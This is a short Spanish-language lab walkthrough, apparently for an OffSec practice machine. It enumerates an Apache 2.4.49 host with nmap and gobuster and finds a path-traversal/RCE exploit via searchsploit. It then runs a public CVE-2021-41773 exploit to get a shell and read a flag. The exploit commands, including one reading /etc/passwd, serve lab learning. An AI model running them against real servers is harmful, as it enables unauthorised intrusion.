# Walk: PublicExploits02

## Fecha: 09/02/2025
## Host: Linux
## IP: 192.168.xxx.188
## Objetivo
Buscar el exploit adecuado para obtener el reverse shell
## Herramientas
1. searchsploit
2. nmap
3. github
## Procedimiento y comandos
#### Paso 1:  Enumeracion
1. Buscamos _puertos_, _servicios_ y _directorios_
- `nmap -sV -p- --script=banner,default 192.168.xxx.188 --min-rate 5000`
- `gobuster dir -u http://192.168.xxx.188 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`
> Resultados de nmap:
```
...
Nmap scan report for 192.168.232.188
Host is up (0.19s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Paradigm Shifts
|_http-server-header: Apache/2.4.49 (Unix)
...
```
>Gobuster no devolvio mucho
#### Paso 2: Buscamos exploits para `Apache httpd 2.4.49 ((Unix))` 
- `searchsploit Apache httpd 2.4.49`
> resultados de searchsploit
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                                                                        | multiple/webapps/50383.sh
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
- Al intentar ejecutar el script, no obtenemos buenos resultados:
` ./50383.sh directories.txt /etc/passwd`
- Buscamos en el navegador y encontramos:
- [github public exploit](https://github.com/thehackersbrain/CVE-2021-41773/tree/main)
#### Paso 3: Obtenemos el flat
- Luego de ejecutar el exploit:  `python3 public_exploit.py -t 192.168.xxx.188`
obtenemos un shell y el directorio _**/home/offsec/**_ obtenemos el flag.txt
- `cat /home/offsec/flag.txt`
